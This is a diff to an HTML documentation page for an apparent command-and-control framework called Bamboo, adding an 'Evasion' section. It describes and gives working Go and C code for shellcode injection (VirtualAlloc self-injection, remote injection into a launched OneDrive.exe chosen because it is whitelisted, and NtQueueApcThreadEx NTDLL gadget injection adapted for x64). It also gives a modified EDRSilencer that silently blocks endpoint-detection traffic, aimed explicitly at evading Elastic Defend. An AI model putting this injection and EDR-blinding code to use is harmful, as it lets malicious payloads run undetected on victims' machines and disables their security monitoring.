@@ -269,28 +269,61 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#name" class="md-nav__link">
+  <a href="#shellcode-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Name
+      Shellcode Injection
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Name">
+    <nav class="md-nav" aria-label="Shellcode Injection">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#description" class="md-nav__link">
+  <a href="#virtual-allocation-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Description
+      Virtual Allocation Injection
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#implementation" class="md-nav__link">
+  <a href="#remote-process-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Implementation
+      Remote Process Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ntqueueapcthreadex-ntdll-gadget-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      NtQueueApcThreadEx NTDLL Gadget Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#edr-blinding" class="md-nav__link">
+    <span class="md-ellipsis">
+      EDR Blinding
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="EDR Blinding">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#edr-silencer" class="md-nav__link">
+    <span class="md-ellipsis">
+      EDR Silencer
     </span>
   </a>
   
@@ -761,28 +794,61 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#name" class="md-nav__link">
+  <a href="#shellcode-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Name
+      Shellcode Injection
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Name">
+    <nav class="md-nav" aria-label="Shellcode Injection">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#description" class="md-nav__link">
+  <a href="#virtual-allocation-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Description
+      Virtual Allocation Injection
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#implementation" class="md-nav__link">
+  <a href="#remote-process-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Implementation
+      Remote Process Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ntqueueapcthreadex-ntdll-gadget-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      NtQueueApcThreadEx NTDLL Gadget Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#edr-blinding" class="md-nav__link">
+    <span class="md-ellipsis">
+      EDR Blinding
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="EDR Blinding">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#edr-silencer" class="md-nav__link">
+    <span class="md-ellipsis">
+      EDR Silencer
     </span>
   </a>
   
@@ -809,10 +875,190 @@
 
 
 <h1 id="evasion">Evasion</h1>
-<p>This page details the evasion techniques included in Bamboo as well as how they were implemented.</p>
-<h2 id="name">Name</h2>
-<h3 id="description">Description</h3>
-<h3 id="implementation">Implementation</h3>
+<h2 id="shellcode-injection">Shellcode Injection</h2>
+<p>Elastic Defend is unable to detect malicious in-memory files. Thus, these shellcode injection techniques are effective in executing payloads undetected.</p>
+<h3 id="virtual-allocation-injection">Virtual Allocation Injection</h3>
+<p>Virtual Allocation injection is a technique used to inject shellcode into memory. As this method of injection uses VirtualAlloc, it allocates and injects shellcode into the memory of its own process.</p>
+<p>The exploits used by Bamboo tend to crash the injected process, so using Virtual Allocation will likely cause the Agent that ran it to crash.</p>
+<p><strong>Mechanism</strong></p>
+<p>The technique involves the following steps:</p>
+<ol>
+<li>Use VirtualAlloc to reserve space to inject the shellcode inside the process.</li>
+<li>Copy the shellcode into the reserved space using RtlCopyMemory.</li>
+<li>Call VirtualProtect to change the protection on the injected space to allow execution.</li>
+<li>Create a new thread in the process using CreateThread to run the shellcode in the injected space.</li>
+<li>WaitForSingleObject is used to wait for the thread to finish.</li>
+</ol>
+<p><strong>Implementation</strong></p>
+<p><a href="https://github.com/zaneGittins/go-inject">zaneGittins’ go-inject</a> simplifies using Windows functions related to injections, and used by the agent to implement this technique.</p>
+<details>
+<summary>Expand code</summary>
+
+
+<pre><code class="language-go">func VirturalAlloc(payload string) (err error) {
+  sc, err := hex.DecodeString(payload)
+  if err != nil {
+    fmt.Printf(&quot;\nError decoding shellcode: %s\n&quot;, err)
+    return
+  }
+
+  address := inject.VirtualAlloc(uintptr(0), len(sc), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+  inject.RtlMoveMemory2(address, sc)
+  inject.VirtualProtect(address, len(sc), windows.PAGE_EXECUTE_READ)
+  thread := inject.CreateThread(address)
+  inject.WaitForSingleObject(thread, 0xFFFFFFFF)
+  return
+}
+</code></pre>
+
+</details>
+
+<hr />
+<h3 id="remote-process-injection">Remote Process Injection</h3>
+<p>Remote Process Injection, also called Vanilla Process Injection, is a shellcode injection technique that injects the shellcode into the memory of another process. Unlike the Virtual Allocation Injection technique earlier, this technique used VirtualAllocEx rather than VirtualAlloc, which allocates memory in another process instead of the local process.</p>
+<p>The advantages of using process injection over injecting into itself are:</p>
+<ul>
+<li>Causing the injected process to crash instead of the agent used to inject.</li>
+<li>Make use of any whitelisting detection tools have for the injected process</li>
+</ul>
+<p><strong>Mechanism</strong></p>
+<p>The steps this technique uses is:</p>
+<ol>
+<li>Get the PID of the process to inject.</li>
+<li>Call OpenProcess to get a handle for the process to inject into.</li>
+<li>Use VirtualAllocEx to allocate space for the shellcode in the remote process.</li>
+<li>Write the shellcode into the allocated space using WriteProcessMemory.</li>
+<li>Create a thread in the remote process with CreateRemoteThread to run the allocated space.</li>
+<li>Close the handle to the process with CloseHandle.</li>
+</ol>
+<p><strong>Implementation</strong></p>
+<p>Instead of finding the PID of a suitable process, the Agent will launch OneDrive.exe from the user’s home directory. OneDrive is a very suitable process to inject into with the exploits Bamboo has, and launching the process before injecting into it will ensure that the process will be available to inject into. It is also whitelisted from Elastic Security’s Component Model Hijacking as it is considered a noisy process.</p>
+<details>
+<summary>Expand code</summary>
+
+
+<pre><code class="language-go">...
+sc, err := hex.DecodeString(payload)
+if err != nil {
+  return
+}
+ find and launch OneDrive.exe and use its PID
+currentUser, _ := user.Current()
+oneDriveExe := currentUser.HomeDir + &quot;\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe&quot;
+cmd := exec.Command(oneDriveExe)
+cmd.Stdout = os.Stdout
+// Start() runs the command without waiting for return - rest of the code can continue
+  err = cmd.Start()
+  if err != nil {
+  fmt.Println(err)
+    return errors.New(&quot;cannot launch process&quot;)
+}
+exploitPID := cmd.Process.Pid
+fmt.Println(&quot;exploit pid:&quot;, exploitPID)
+...
+</code></pre>
+
+</details>
+
+<p>The rest of the injection technique is implemented with <a href="https://github.com/zaneGittins/go-inject">zaneGittins’ go-inject</a> library.</p>
+<details>
+<summary>Expand code</summary>
+
+
+<pre><code class="language-go">...
+processHandle, _ := inject.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uint32(int(exploitPID)))
+memptr := inject.VirtualAllocEx(processHandle, uintptr(0), len(sc), 0x3000, 0x40)
+
+_ = inject.WriteProcessMemory(processHandle, memptr, sc)
+inject.CreateRemoteThread(processHandle, 0, 0, memptr, 0, 0, 0)
+inject.CloseHandle(processHandle)
+fmt.Println(windows.GetLastError())
+return
+</code></pre>
+
+</details>
+<hr />
+<h3 id="ntqueueapcthreadex-ntdll-gadget-injection">NtQueueApcThreadEx NTDLL Gadget Injection</h3>
+<p><strong>Description</strong></p>
+<p>This is a novel shellcode injection method first used by Roshtyak, the DLL backdoor used by the malware Raspberry Robin. This was adapted into a C program and published on github by <a href="https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection">LLoydLabs</a>, which is the original code Bamboo uses for its NtQueueApcThreadEx NTDLL Gadget Injection. The image below shows the parameters of <code>NtQueueApcThreadEx()</code>, a function in the Windows Native API.</p>
+<p><img alt="ntqueueapcthreadex_api" src="img/ntqueue.png" /></p>
+<p>A brief overview of this technique involves allocating shellcode into the current process memory and pointing the <code>SystemArgument</code> parameter of <code>NtQueueApcThreadEx()</code> to the shellcode address, then abusing the <code>ApcRoutine</code> parameter of <code>NtQueueApcThreadEx()</code> by pointing it to a random NTDLL gadget that meets the requirements of <code>pop r32; ret</code>. This then returns into the <code>SystemArgument</code> parameter which executes the shellcode. The above gadget only works for x86 shellcode. The technique used in Bamboo uses the gadget <code>pop rax; ret</code> instead, making it work for x64 shellcode instead. This technique requires Microsoft Visual C++ redistributables x86 to be installed on the target which can be found at <a href="https://aka.ms/vs/16/release/vc_redist.x86.exe">https://aka.ms/vs/16/release/vc_redist.x86.exe</a>.</p>
+<p><strong>Implementation</strong></p>
+<p>The code is modified to work with x64 shellcode by changing a single line in gadget.h as shown in the code snippet below.</p>
+<details>
+<summary>Expand code</summary>
+
+
+<pre><code class="language-c">static
+BOOL
+gadget_match_valid(
+    PBYTE pbAddress
+)
+{
+    //return (*pbAddress != 0x5C &amp;&amp; (*pbAddress &amp; 0xF0) == 0x50) &amp;&amp; *(pbAddress + 1) == 0xC3; // for x86
+    return *pbAddress == 0x58 &amp;&amp; *(pbAddress + 1) == 0xC3; // for x64
+
+}
+</code></pre>
+
+</details>
+
+<p>In the original code, the shellcode was hardcoded in main.h. In Bamboo, the code is modified to receive shellcode via standard input. After the injection program is dropped onto the target and executed, the shellcode will be passed via standard input from the agent as a hexstring in the format “ab1823129ef…”, which is the standard format of shellcode that our agent uses for its injection techniques. This hexstring is stored into a buffer of the injection program and converted by a <code>convert_hex()</code> function into a hexstring of format “\xab\x18\x23\x12\xef…”. The rest of the code follows the logic of the original PoC from LloydLabs.</p>
+<hr />
+<h2 id="edr-blinding">EDR Blinding</h2>
+<p>The tool below is used to disrupt the effectiveness of the EDR itself.</p>
+<h3 id="edr-silencer">EDR Silencer</h3>
+<p><strong>Description</strong></p>
+<p>EDRSilencer, created by <a href="https://github.com/netero1010">netero1010</a> is an <a href="https://github.com/netero1010/EDRSilencer">open-source</a> evasion tool designed for disrupting Endpoint Detection and Response (EDR) systems. It leverages Windows Filtering Platform (WFP) APIs, which allows a program developer to create network filtering software that can examine, modify and stop network traffic. EDRSilencer uses the WFP to prevent EDR agents and processes from connecting and reporting security events with their servers, effectively disabling the EDR’s threat detection capabilities of the EDR. The tool currently supports Elastic EDR, among other popular EDR solutions.</p>
+<p><strong>Implementation</strong></p>
+<p>In the <a href="https://github.com/netero1010/EDRSilencer/blob/main/EDRSilencer.c">original code's</a> main function, it checks if the user inputs the correct number of command-line arguments and performs different actions based on the argument’s value:</p>
+<table>
+<thead>
+<tr>
+<th>Arguments</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-h or --help</td>
+<td>Prints the help information</td>
+</tr>
+<tr>
+<td>blockedr</td>
+<td>Blocks all detected EDR processes from sending outbound traffic</td>
+</tr>
+<tr>
+<td>block <process path></td>
+<td>Blocks a specific process from sending outbound traffic</td>
+</tr>
+<tr>
+<td>unblockall</td>
+<td>Removes all WFP filters applied</td>
+</tr>
+<tr>
+<td>unblock <filter id></td>
+<td>Removes a specific WFP filter based on its filter ID</td>
+</tr>
+</tbody>
+</table>
+<p>The team modified the main function of the original code. The modified code no longer requires command-line arguments. It has been altered to only execute the  <code>blockedr</code> argument. The modified code is as follows:</p>
+<details>
+<summary>Expand code</summary>
+
+
+<pre><code class="language-c">int main() {
+    if (!CheckProcessIntegrityLevel()) {
+        return 1;
+    }
+    PrintHelp();
+    BlockEdrProcessTraffic();
+    return 0;
+}
+</code></pre>
+
+</details>
+<p>This modification allows the executable to be easily incorporated within our C2 and agent, making it more convenient and efficient for our purposes.</p>
 
 
 
